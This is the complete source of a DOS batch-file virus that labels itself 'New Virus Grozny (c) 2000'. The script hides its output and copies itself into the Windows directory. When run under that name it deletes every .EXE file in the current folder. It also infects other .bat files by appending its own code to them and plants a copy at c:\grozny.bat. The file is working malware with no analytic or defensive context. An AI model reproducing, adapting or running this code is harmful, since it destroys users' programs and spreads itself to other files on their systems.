:ษหหอออออออออออออออออออออออออออออออออออออหหป
:ฬฮน    New Virus Grozny (c) 2000        ฬฮน
:ศสสอออออออออออออออออออออออออออออออออออออสสผ
@ctty nul
set gr= *.bat
copy %0 %windir%\temp.bat
if "%0"=="TEMP.BAT goto r
goto grozn
:r
@del *.EXE
:grozn
for %%a in (%gr%) do set Grozny= %%a
for %%b in (%gr%) do call find "Grozny" %%b
if not errorlevel 1 goto grozny
for %%c in (%gr%) do copy %%c+%0
:grozny
if not exist c:\grozny.bat copy %0 c:\grozny.bat
